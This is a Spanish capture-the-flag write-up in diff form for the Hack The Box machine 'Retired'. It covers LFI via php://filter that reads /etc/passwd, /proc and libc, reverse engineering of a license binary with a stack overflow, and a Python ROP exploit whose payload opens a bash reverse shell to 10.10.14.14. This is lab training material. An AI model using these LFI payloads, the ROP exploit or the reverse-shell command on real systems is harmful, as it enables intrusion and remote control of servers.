@@ -1,6 +1,8 @@
 # 10.10.11.154 - Retired
-------------------------
+![Retired](https://user-images.githubusercontent.com/96772264/213869676-8cef5005-ac7b-45a2-9745-78ff28d10f9a.png)
 
+------------------------
+# Part 1: Enumeración
 Puertos abiertos -> 22(ssh), 80(http)
 ```console
 └─$ whatweb http://10.10.11.154/
@@ -23,8 +25,11 @@ Bootstrap, HTML5, HTTPServer[nginx], IP[10.10.11.154], Script, Title[Agency - St
 ```
 
 La url es 10.10.11.154/index.php?page=default.html
+![retired1](https://user-images.githubusercontent.com/96772264/213868928-460b7621-ca15-4788-8f68-901e55fdc29a.PNG)
 
-## LFI
+----------------------------
+# Part 2: LFI
+
 ```console
 http://10.10.11.154/index.php?page=default.html -> default.html
 http://10.10.11.154/index.php?page=default.html/../../../../../etc/passwd -> nada
@@ -57,7 +62,12 @@ bullseye, retired,
 └─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/sched_debug | base64 -d | grep -P "\d" | grep -E "^ S|^ I" | grep -vE "scsi|system|kworker|card|irq|dbus|rcu" | awk '{print $2 " -> " $3}' > tee processes
 ```
 
+----------------------------
+# Part 3: Descubriendo un binario
+
 La página beta.html dice tal que así:
+![retired2](https://user-images.githubusercontent.com/96772264/213868940-5b01c97b-03b1-40c2-a0b3-c0a8dc68c675.PNG)
+
 ```
 Actualmente desarollando para EMUEMU (lo busque en google pero no hay nada). Si nos compraste una consola OSTRICH 
 y quieres participar en el siguiente paso puedes activar tu licencia con la app "activate_license"
@@ -84,8 +94,7 @@ if(isset($_FILES['licensefile'])) {   // Si el archivo que se sube es 'licensefi
     socket_shutdown($socket); socket_close($socket);}?> // cierra el socket.
 ```
 
-Es decir tenemos un socket que le pasa a un programa nuestro archivo ¿Pero a cual?. Podemos tirar de ese archivo
-que creamos antes con el LFI...
+Es decir tenemos un socket que le pasa a un programa nuestro archivo ¿Pero a cual?. Podemos tirar de ese archivo que creamos antes con el LFI...
 ```console
 └─$ cat proceses | grep -E "activate|license"
 activate_licens -> 413
@@ -112,7 +121,7 @@ AAAA
 [+] reading 1094795585 bytes
 [+] activated license:
 ```
-Por netcat podemos hacer que funcione mejor
+Por netcat podemos hacer que funcione mejor:
 ```console
 └─$ python3 -c "print('A'*4 + 'A'*6)" | nc localhost 666
 └─$ ./activate_licens 666
@@ -122,9 +131,15 @@ Por netcat podemos hacer que funcione mejor
 [+] reading 1094795585 bytes
 [+] activated license: AAAAAA
 ```
+--------------------------------
+**Disclaimer**: A partir de aqui tuve que tirar del [writeup de s4vitar](https://www.youtube.com/watch?v=ys-az6SyheE) porque es un ROP muy complejo,
+asi que el credito es suyo. Aunque he seguido la logica todavia no me ha funcionado.
+En vez de empaquetar con pwmtools como él (p64) lo he hecho con una libreria llamada struct que es propia de python. Hace lo mismo.
 
-Si abrimos el programa con ghydra (he cambiado nombres de funciones y eliminado salidas de error
-para hacerlo mas ligero):
+----------------------------
+# Part 4: Desensamblando el binario
+
+Si abrimos el programa con ghydra (he cambiado nombres de funciones y eliminado salidas de error para hacerlo mas ligero):
 
 ```c
 int main(int argc,char **argv) {
@@ -155,8 +170,7 @@ int main(int argc,char **argv) {
   		activate_license(sockfd);
   		exit(0);}
 ```
-Luego tenemos esa función "activate_license"
-
+Luego tenemos esa función "activate_license":
 ```c
 void activate_license(int sockfd){
   int sqlite;
@@ -182,6 +196,9 @@ key TEXT)" ,0,0,0);
   printf("[+] activated license: %s\n",buffer); return;}
 ```
 
+----------------------------
+# Part 5: Descubriendo en bug
+
 Pero y si lo que le metemos a buffer por sockfd es mas grande que lo especificado en mslen?
 ```
 └─$ printf "\x00\x00\x00\x01AAAA" | nc localhost 6668
@@ -191,10 +208,8 @@ Pero y si lo que le metemos a buffer por sockfd es mas grande que lo especificad
 [+] reading 1 bytes
 [+] activated license: A
 ```
-Si le mandamos esto ```printf "\x00\x00\x02\x00$(python3 -c 'print("A" * 600)')" | nc localhost 6668``` 
-(mete 600 A en 512 de tamaño) al final de las AAA pone bytes extraños, el proceso se ha corromprido de 
-cierta manera. Pero por que no da SEGFAULT? porque es un proceso hijo
-
+Si le mandamos esto ```printf "\x00\x00\x02\x00$(python3 -c 'print("A" * 600)')" | nc localhost 6668```  (mete 600 A en 512 de tamaño) al final
+de las AAA pone bytes extraños, el proceso se ha corromprido de cierta manera. Pero por que no da SEGFAULT? porque es un proceso hijo
 Si lo corremos con gdb en otro puerto ej:
 ```console
 └─$ gdb ./activate_licens
@@ -203,8 +218,6 @@ gef➤  r 6667
 # printf "\x00\x00\x03\x00$(python3 -c 'print("A" * 1000)')" | nc localhost 6668
 # >>> SEGFAULT (mete 1000 A en 768 bytes)
 ```
-
-# -------------------
 
 Vemos primero las protecciones:
 ```console
@@ -218,14 +231,14 @@ PIE                           : ✓ -> memoria aleatorizada
 Fortify                       : ✘
 RelRO                         : Full -> No podemos modificar la tabla GOT
 ```
-Conseguir la libc que esta usando:
+Primero hay que conseguir la libc que esta usando:
 ```console
 └─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/413/maps | base64 -d  | grep "libc"
 7fc8a1464000-7fc8a1489000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
 └─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/usr/lib/x86_64-linux-gnu/libc-2.31.so | base64 -d > libc-2.31.so
 ```
 Conseguir las direcciones base (libc y el binario):
-Como las direcciones cambian siemore que se reinicia la maquina con este script se pillan
+Como las direcciones cambian siempre que se reinicia la maquina con este script se pillan:
 ```bash
 base64_url="http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource="
 pid=$(curl -s $base64_url/proc/sched_debug | base64 -d | grep "activate_licens" | awk '{print $3}') 
@@ -236,18 +249,7 @@ echo "Direccion de memoria del binario -> 0x${libc_memory}"
 echo "Direccion de memoria de libc -> 0x${libc_memory}"
 ```
 
-Ver que parte del bianrio tiene permisos de escritura
-```console
-└─$ rabin2 -S ./activate_licens | grep "w"
-19  0x00002cb8    0x8 0x00003cb8    0x8 -rw- .init_array
-20  0x00002cc0    0x8 0x00003cc0    0x8 -rw- .fini_array
-21  0x00002cc8  0x200 0x00003cc8  0x200 -rw- .dynamic
-22  0x00002ec8  0x138 0x00003ec8  0x138 -rw- .got
-23  0x00003000   0x10 0x00004000   0x10 -rw- .data
-24  0x00003010    0x0 0x00004010    0x8 -rw- .bss
-```
-
-¿Cuando corrompemos la pila (sobreescribir rip)?
+¿Cuando corrompemos la pila (sobreescribir rip)? 
 ```console
 gef➤ pattern create 1024
 aaaaaaa...aaaaf
@@ -256,56 +258,58 @@ aaaaaaa...aaaaf
 $rsp   : 0x007fffffffded8  →  "paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]"
 $rbp   : 0x636161616161616f ("oaaaaaac"?)
 $rsi   : 0x005555555592a0  →  "[+] activated license: aaaaaaaabaaaaaaacaaaaaaadaa[...]"
-
 [+] Found at offset 520 (little-endian search) likely
 ```
-```console
-└─$ objdump -d libc-2.31.so | grep "system"    
-0000000000048e50 <__libc_system@@GLIBC_PRIVATE>:
-# Tambien con readelf -> readelf -s libc-2.31.so | grep "system" 
-```
+Tras 520 bytes basura
 
-```console
-└─$ ropper -f libc-2.31.so --search "pop rdi; ret"
-0x0000000000026796: pop rdi; ret;
-└─$ ropper -f libc-2.31.so --search "pop rsi; ret"
-0x000000000002890f: pop rsi; ret;
-└─$ ropper -f libc-2.31.so --search "mov [rdi], rsi; ret"
-0x00000000000603b2: mov qword ptr [rdi], rsi; ret;
-```
+----------------------------
+# Part 6: Armando el exploit
+
+Ahora armar el exploit.
+Consiste en crear ->  ```system("bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'")```
 
 ```python
 #!/usr/bin/python3
-import socket
+import socket, requests
 from struct import pack
-import requests
 
-cmd = b"bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'"
 libc_base = 0x7f356ace6000
 binary_base = 0x5646c60f3000
-writable = binary_base + 0x00003000
-system = pack("<q",(libc_base + 0x00048e50))
-pop_rdi = pack("<q",(libc_base + 0x0026796))
-pop_rsi = pack("<q",(libc_base + 0x002890f))
-mov_rdi_rsi = pack("<q",(libc_base + 0x000603b2))
+
+cmd = b"bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'" # Comando que le queremos pasar a system()
+# Ver una seccion con permisos de escritura en el binario a la que meterle esa cadena cmd:
+# └─$ rabin2 -S ./activate_licens | grep "w" 
+#  0x00003000   0x10 0x00004000   0x10 -rw- .data
+writable = binary_base + 0x00003000 
+
+# Buscar system 
+system = pack("<q",(libc_base + 0x00048e50)) # -> objdump -d libc-2.31.so | grep "system"  
+
+# Buscar los gadgets que permitan cargar en los registros datos para que las funciones los tomen como argumentos.
+pop_rdi = pack("<q",(libc_base + 0x0026796)) # -> ropper -f libc-2.31.so --search "pop rdi; ret"
+pop_rsi = pack("<q",(libc_base + 0x002890f)) # ->  ropper -f libc-2.31.so --search "pop rsi; ret"
+mov_rdi_rsi = pack("<q",(libc_base + 0x000603b2)) # -> ropper -f libc-2.31.so --search "mov [rdi], rsi; ret"
 payload = b'A' * 520
 
-# Mete en writable de 8 en 8 bytes el comando
-# ROP -> rdi=writable  rsi=cmd   mov [rdi <- rsi] 
+# Mete en la seccion con permiso de escritura  (writable) de 8 en 8 bytes el comando
+# ROP -> Tenemos en [rdi] (seccion con permiso de escritura || En [rsi] cmd 
+# Asi que moveremos el cmd de rdi a rsi donde esta la seccion con permiso de escritura -> ( mov [rdi <- rsi] )
 for i in range(0, len(cmd), 8):
 	payload += pop_rdi
 	payload += pack("<q",(writable + i))
 	payload += pop_rsi
-	payload += cmd[i:i+8].ljust(8, b"\x00")  # [0:8] [8:16] [16:24]...
+	payload += cmd[i:i+8].ljust(8, b"\x00")  # [0:8] [8:16] [16:24]... Ljust es para no dejar una ultima cadena de un byte y rellenarlo con "0"
 	payload += mov_rdi_rsi
 
+# Ahora ya tenemos el comando almacenado en la seccion con permisos de escritura, ahi que pasarsela a system mediante rdi.
 # system() <- rdi
 payload += pop_rdi
 payload += pack("<q",writable)
 payload += system
+
+# Toda esa cadena se mete en el archivo file.key que es el que se enviará a la máquina
 with open("file.key", "wb") as f:
 	f.write(payload)
-
 file = {'licensefile':("file.key", open("file.key","rb"), 'application/x-iwork-keynote-sffkey')}
 url = "http://10.10.11.154/activate_license.php"
 req = requests.post(url, files=file)
